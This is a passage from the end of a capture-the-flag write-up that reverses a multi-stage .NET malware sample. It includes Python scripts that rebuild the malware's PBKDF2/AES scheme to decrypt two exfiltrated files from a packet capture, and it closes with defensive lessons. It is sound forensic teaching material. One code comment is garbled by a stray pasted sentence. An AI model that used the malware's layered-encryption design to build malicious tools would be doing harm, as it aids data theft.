    print("[+] MD5 (hex)    :", md5.hex())
    print("[+] MD5 (Base64) :", b64encode(md5).decode())

if __name__ == "__main__":
    main()

```

```bash
C:\Users\xxx\Desktop\Malception>python.exe rsa_md5_decrypt.py
[+] MD5 (hex) : a1b1fe69870cb17c5352d13538e1392a
[+] MD5 (Base64) : obH+aYcMsXxTUtE1OOE5Kg==
```

We are finally close to the solution! ❤️  
We now have the base64-encoded hash password that was used to AES-encrypt `secret.jpg.enc` (which is most likely our flag).  
Let’s save the AES-encrypted blob—the final part of the communication stream we’ve been analyzing.

![Screenshot](Images/Pasted%20image%2020250717174503.png)

and use the following python3 code to decrypt it:

```python
#!/usr/bin/env python3
# decrypt_secret.py  •  pip install pycryptodome
#
# Uses the very same parameters the .NET code (Graphy.Encrypt<RijndaelManaged>)
# employed:  PBKDFand use the following python3 code to decrypt it!2-SHA1, Salt = [21,204,127,…], Iterations = 2, KeySize = 256,
# AES-CBC, PKCS7 padding.

from pathlib import Path
from base64   import b64encode
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher       import AES
from Crypto.Util.Padding import unpad

# ----------------------------------------------------------------------
# ❶  inputs – edit if your paths / MD5-b64 differ
# ----------------------------------------------------------------------
ENC_PATH   = Path("secret.jpg.enc")     # ciphertext from the malware
OUT_PATH   = Path("secret.jpg")         # decrypted output
MD5_B64    = "obH+aYcMsXxTUtE1OOE5Kg==" # [+] MD5 (Base64) you recovered

# Graphy hard-coded constants
SALT       = bytes([21, 204, 127, 153, 3, 237, 10, 26,
                    19, 103, 23, 31, 55, 49, 32, 57])
ITERATIONS = 2
KEY_SIZE   = 32          # 256 bits
IV_SIZE    = 16          # AES block

# ----------------------------------------------------------------------
def derive_key_iv(password_str: str) -> tuple[bytes, bytes]:
    """
    Replicates .NET Rfc2898DeriveBytes successive .GetBytes() calls.
    First 32 bytes → key, next 16 bytes → IV.
    """
    pwd_bytes = password_str.encode("utf-8")                # ASCII chars
    blob48    = PBKDF2(pwd_bytes, SALT,
                       dkLen=KEY_SIZE + IV_SIZE,
                       count=ITERATIONS)                    # SHA-1 under the hood
    return blob48[:KEY_SIZE], blob48[KEY_SIZE:]

def decrypt(ciphertext: bytes, key: bytes, iv: bytes) -> bytes:
    aes = AES.new(key, AES.MODE_CBC, iv)
    return unpad(aes.decrypt(ciphertext), AES.block_size)

def main() -> None:
    key, iv = derive_key_iv(MD5_B64)
    ct      = ENC_PATH.read_bytes()
    plain   = decrypt(ct, key, iv)

    OUT_PATH.write_bytes(plain)
    print(f"[+] Decryption OK  →  {OUT_PATH}  ({len(plain)} bytes)")
    print("    Key :", key.hex())
    print("    IV  :", iv.hex())

if __name__ == "__main__":
    main()
```

```bash
C:\Users\xxx\Desktop\Malception>python.exe decrypt_secret.py
[+] Decryption OK → secret.jpg (39004 bytes)
Key : b19022f391b4bfecfa4063ef5a2f1ecdb878c9d4b8b4abb650bd515078409ac4
IV : 3dbd5894933697225d6ca0b67f79c5ab
```

![Screenshot](Images/Pasted%20image%2020250717174630.png)

...I’m tired, guys.  
But let’s not give up after all the hard work. We’ve already dealt with everything else—RC4, AES, RSA—so now it’s time to look back at what we’ve done so far.

Up to this point, we’ve been assuming there was only one file under Documents. But what if that entire loop happened again for another file?

In fact, if we re-analyze the pcap file, there’s another stream similar to the previous one—but this time, it’s for a different file.

![Screenshot](Images/Pasted%20image%2020250717174644.png)
So we can reproduce all the steps we followed earlier to retrieve the cat, but this time on the new stream:

1. Save this stream as a raw hex dump.
    
2. Re-run the filename decryptor with the new encrypted filename hex to obtain:  
    `C:\Users\rick.a\Documents\Important\Official.pdf.enc`  
    (Let’s hope it’s not a dog this time.)
    
3. Update the `private_key_recovery.py` script with the new `XORed_result` blob and re-run it to generate the new `priv.xml`.
    
4. Update the `rsa_md5_decrypt.py` script with the new RSA-MD5-encrypted text and run it to obtain the MD5 hash:  
    `MD5_hash: ea19bcc99be7ed590c20ff46d0451bfc`  
    `MD5_Base64: 6hm8yZvn7VkMIP9G0EUb/A==`
    
5. Save the encrypted file blob from the stream.
    
6. Update the `decrypt_secret.py` script with the correct new AES key and execute it to decrypt the PDF.

![Screenshot](Images/Pasted%20image%2020250717174755.png)

DONE!!!!!!!!!

---
## ✅ Challenges Encountered / Lessons Learned
- **Multi‑layered encryption complexity:** Unraveling RC4, RSA and AES stages required carefully correlating PCAP‑extracted data with the binary’s runtime behavior.  
- **Offline C2 server:** With the remote C2 unreachable, we had to extract every handshake and payload from the packet capture to recover keys and blobs.  
- **Key derivation dependencies:** The RC4 key depended on a per‑host XOR with a server nonce, forcing us to brute‑test plausible hostnames gleaned from Kerberos/SMB leaks.  
- **Resource unpacking & patching:** Reconstructing the full .NET payload meant exporting and decrypting the embedded `RT_RCDATA`, then manually merging at the right offset.  
- **Automating cryptographic steps:** Writing small Python tools to implement the malware’s RC4, RSA key‑unmasking, RSA decryption and AES unwrapping greatly sped up iterative testing and validation.

---
## 🏁 Conclusion
By combining static binary analysis, packet‑level forensics, and custom scripting, we fully reversed the multi‑stage malware:
1. Identified and decrypted the RC4‑protected .NET stager (blob A) and resource payload (blob B).  
2. Extracted and reconstructed the RC4 key via hostname‑nonce inference.  
3. Unmasked the embedded RSA private key, decrypted the MD5‑derived AES key, then successfully recovered and decrypted two exfiltrated files (`secret.jpg.enc` and `Official.pdf.enc`) containing the challenge flag.  
This end‑to‑end approach highlights the power of blending network analysis with reverse engineering and underscores the importance of capturing complete PCAP artifacts.

---
## 💡 Additional Notes / Reflections
- **Defensive insight:** Layered malware often hides critical data in network traffic; defenders should retain full packet captures and inspect less common ports.  
- **Tool synergy:** No single tool suffices—Wireshark, IDA, PE analyzers, Resource Hacker and lightweight Python scripts each played a key role.  
- **Reproducibility:** Automating decryption routines not only saved time but provided auditable, repeatable steps—vital in professional incident response.  
- **Future improvements:** For challenges like this, integrating automated hostname‑brute tooling against PCAP‑extracted nonces could further streamline RC4 key recovery.  
- **Learning takeaway:** Always look for “side‑channel” leaks (e.g. Kerberos hostname exposures) when direct decryption seems impossible—sometimes the clue is hiding in plain sight.  
